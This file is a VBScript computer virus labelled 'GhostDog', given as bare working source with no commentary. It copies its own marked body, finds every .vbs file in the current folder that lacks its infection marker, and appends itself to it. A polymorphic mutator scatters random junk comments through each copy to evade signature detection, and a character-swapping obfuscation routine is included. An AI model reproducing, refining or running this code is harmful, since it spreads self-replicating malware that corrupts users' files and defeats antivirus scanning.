''GhostDog
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
'vNCFvXxaCoMBqGSyxjjOYfLbKeyM
Set OpenBody = FSO.OpenTextFile (Wscript.ScriptFullName, 1, 0, 0)
Body = OpenBody.ReadAll
OpenBody.Close
'vpKHaOZaiCDhImTePWluiSNNLRAsBc
Strings = Split (Body, vbCrLf)
For x = 0 To UBound (Strings) Step 1
If Strings(x) = Chr(39) & Chr(39) & "GhostDog" Then
'pIMPGb
Exit For
End If
Next
'kYUHTJY
For x = x To UBound (Strings) Step 1
If Mid (Strings(x), 1, 1) = Chr(39) And Mid (Strings(x), 2,1) <> Chr(39) Then
x = x
'RQCmRkxOtNwCROIZsRls
Else
ClearBody = ClearBody & Strings(x) & vbCrLf
If Strings(x) = Chr(39) & Chr(39) & "Doggy" Then
'BFVnozKFfwSiExlVdTLTuJIbY
Exit For
End If
End If
'LDlXZqWkwUcUFdDBaMPUqUbolLd
Next
Set OurPath = FSO.GetFolder (".")
Set FileList = OurPath.Files
'vrEXh
For Each x In FileList
If FSO.GetExtensionName (x) = "vbs" Or FSO.GetExtensionName (x) = "VBS" Then
Set VictimFile = FSO.OpenTextFile (x, 1, 0, 0)
'rDXxAe
VictimBody = VictimFile.ReadAll
VictimFile.CLose
Infected = False
'HQE
For y = Len(VictimBody) To 1 Step -1
If Mid (VictimBody, y, 5) = Chr(39) & Chr(39) & "Dog" Then
Infected = True
'rrqRkrAcqpIMPGbskYEHE
Exit For
End If
Next
'YUBQmmR
If Infected = False Then
MutateBody = vbCrLf & Mutator (ClearBody)
Set Victim = FSO.OpenTextFile (x, 8, 0, 0)
'iOdNhCCOHJcQclF
Victim.Write MutateBody
Victim.CLose
End If
'jKEfhRYnwlUPQ
End If
Next
Function Mutator (CodeToMutate)
'TDKSeJIPSI
Strings = Split (CodeToMutate, vbCrLf)
CommentsCount = Cbyte (GetRndNumber(3, UBound(Strings) / 1.5))
CommentPlace = Cbyte (UBound(Strings) / CommentsCount)
'LmkWKaWMgTTFFdmBavzU
y = 0
For b = 0 To UBound(Strings) Step 1
DoMutateBody = DoMutateBody & Strings(b) & vbCrLf
'URKucouqEXYprCHizdk
y = y + 1
If y = CommentPlace Then
Comment = MakeComment
'PEgbca
DoMutateBody = DoMutateBody & Comment
y = 0
End If
'VNVxLbewFnisinyffXIgF
Next
Mutator = DoMutateBody
End Function
'dObSWtgdqnNf
Function MakeComment
CommentLenght = Cbyte (GetRndNumber(3, 30))
DoComment = Chr(39)
'OJOScA
For z = 1 To CommentLenght Step 1
a = CByte(GetRndNumber (65, 122))
If a < 91 Or a > 96 Then
'MXRs
DoComment = DoComment & Chr(a)
Else
z = z - 1
'uQKyblmk
End If
Next
MakeComment = DoComment & vbCrLf
'XIWVhlofHYPxdgDdixJapbSqP
End Function
Function GetRndNumber (r_a, r_b)
Randomize
'nYlaEbngBx
r_c = (r_b - r_a) * Rnd + r_a
GetRndNumber = r_c
End Function
'pRIEReuSFPjdLN

Function snphhuatvsbkwuj(zwbyjntbpmhqqgh)
For vvpzxfszgnczrao = 1 To Len(zwbyjntbpmhqqgh)
'NTRtEFDJcjrihzEHxZkbQvyVvB
ccuhbhjhyzkheeq = Mid(zwbyjntbpmhqqgh, vvpzxfszgnczrao, 1)
If Asc(ccuhbhjhyzkheeq) <> 34 And Asc(ccuhbhjhyzkheeq) <> 35 Then
If Asc(ccuhbhjhyzkheeq) Mod 2 = 0 Then
'MsIeeJSaGE
ccuhbhjhyzkheeq = Chr(Asc(ccuhbhjhyzkheeq) + 1)
Else
ccuhbhjhyzkheeq = Chr(Asc(ccuhbhjhyzkheeq) - 1)
'tWtGyTBIUWdwNVXbCv
End If
End If
snphhuatvsbkwuj = snphhuatvsbkwuj & ccuhbhjhyzkheeq
'JQfodMHIGLuCKBzSH
Next
End Function

'ANnVTymJ



'nEPvvhhMVdJHcvKwtmHELXZgyBYeF
